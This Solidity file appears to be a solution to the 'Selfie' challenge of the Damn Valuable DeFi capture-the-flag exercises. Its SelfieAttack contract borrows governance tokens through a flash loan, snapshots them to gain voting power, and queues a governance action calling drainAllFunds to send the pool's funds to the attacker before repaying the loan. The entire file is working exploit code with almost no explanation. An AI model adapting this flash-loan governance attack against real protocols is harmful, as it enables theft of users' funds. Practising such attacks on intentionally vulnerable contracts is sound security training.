pragma solidity 0.8.7;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
contract SelfieAttack {
    
    address attacker;
    SelfiePool selfiePool;
    SimpleGovernance simpleGovernance;
    constructor(SelfiePool _selfiePool, SimpleGovernance _simpleGovernance){
        attacker = msg.sender;
        selfiePool = _selfiePool;
        simpleGovernance = _simpleGovernance;
    }

    function queueDrainAction(uint borrowAmount) external{
        //take the flashloan so we can get enough tokens to queue a governance action
        selfiePool.flashLoan(borrowAmount);
    }

    function receiveTokens(address tokenAddress ,uint256 amount) external {
        //first let's take a snapshot of the token so the state reflects our new voting power
        DamnValuableTokenSnapshot(tokenAddress).snapshot();

        //now queue the governance action to drain funds !
        bytes memory data = abi.encodeWithSignature(
                "drainAllFunds(address)",
                attacker
            );
        simpleGovernance.queueAction(address(selfiePool), data, 0);

        //pay back the flashloans
        DamnValuableTokenSnapshot(tokenAddress).transfer(address(selfiePool), amount);

    }
    
}